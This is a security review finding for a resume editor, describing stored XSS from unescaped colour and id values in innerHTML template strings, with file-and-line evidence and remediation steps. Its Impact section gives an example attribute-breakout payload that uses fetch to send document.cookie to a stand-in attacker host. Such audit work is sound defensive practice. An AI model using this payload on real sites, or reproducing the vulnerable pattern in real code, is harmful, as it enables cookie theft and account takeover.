> Tracking ID: `SEC-06` · Severity: **High** · CWE-79 / CWE-116
>
> Full context: `SECURITY_REVIEW.md` at the repository root

## Summary
The colour swatch builder writes `resume.color` directly into an HTML template string. `escapeHtml()` escapes HTML characters but not CSS, and here it is not applied at all.

## Evidence
- `js/editor.js:421-423` — `el.swatches.innerHTML = colors.map((color) => \`<button ... style="background:${color}" data-color="${color}" aria-label="Accent color ${color}" ...>\`)`.
- `laravel/public/js/editor.js:453-455` — same code in the Laravel build.
- `js/landing.js:30-31` — similar pattern, but fed only from the hardcoded `COLORS` constant (safe today).
- `js/app.js:216` — `href="editor.html?id=${resume.id}"` / `aria-label="Open ..."` uses `resume.id` without escaping.
- `js/render.js:1682` — `style="--cv-accent:${esc(color)}"` applies HTML escaping, which does not neutralise CSS.

## Impact
`resume.color` and `resume.id` are user-controlled (localStorage in the static build, `PUT /resumes/{id}` in Laravel — see SEC-05). A value such as `red" onmouseover="fetch('//attacker/'+document.cookie)` breaks out of the attribute and executes script in the editor and on any page that renders the resume. In Laravel this becomes stored, same-origin XSS that can read the CSRF token and act as the victim.

## Remediation
- Never build attributes from raw values: use `escapeHtml()` (extend it to encode for attribute context) or construct elements with `document.createElement` + `setAttribute` + `textContent`.
- Validate colours against `/^#[0-9a-fA-F]{6}$/` at the API boundary and again before rendering; fall back to a safe default.
- Escape `resume.id` in `resumeCard()` and use `encodeURIComponent` for query parameters.
- Add a Content Security Policy that forbids inline event handlers (see SEC-14).
